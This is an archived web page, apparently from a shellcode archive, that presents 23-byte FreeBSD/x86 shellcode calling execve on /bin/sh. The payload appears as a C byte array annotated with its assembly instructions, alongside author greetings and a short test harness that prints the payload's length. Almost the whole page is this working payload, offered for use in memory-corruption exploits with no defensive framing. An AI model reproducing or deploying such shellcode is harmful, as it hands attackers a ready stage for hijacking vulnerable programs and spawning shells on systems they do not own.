<html><head><title>FreeBSD/x86 - /bin/sh - 23 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* FreeBSD 23 byte execve code. Greetz to anathema, the first who published  *
 * this way of writing shellcodes.                                           *
 *  greetz to preedator                              marcetam                *
 *                                                admin@marcetam.net         *
 ****************************************************************************/


char fbsd_execve[]=
  &quot;\x99&quot;                  /* cdq              */
  &quot;\x52&quot;                  /* push %edx        */
  &quot;\x68\x6e\x2f\x73\x68&quot;  /* push $0x68732f6e */
  &quot;\x68\x2f\x2f\x62\x69&quot;  /* push $0x69622f2f */
  &quot;\x89\xe3&quot;              /* movl %esp,%ebx   */
  &quot;\x51&quot;                  /* push %ecx - or %edx :) */
  &quot;\x52&quot;                  /* push %edx - or %ecx :) */
  &quot;\x53&quot;                  /* push %ebx        */
  &quot;\x53&quot;                  /* push %ebx        */
  &quot;\x6a\x3b&quot;              /* push $0x3b       */
  &quot;\x58&quot;                  /* pop %eax         */
  &quot;\xcd\x80&quot;;             /* int $0x80        */


int main() {
  void (*run)()=(void *)fbsd_execve;
  printf(&quot;%d bytes \n&quot;,strlen(fbsd_execve));
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
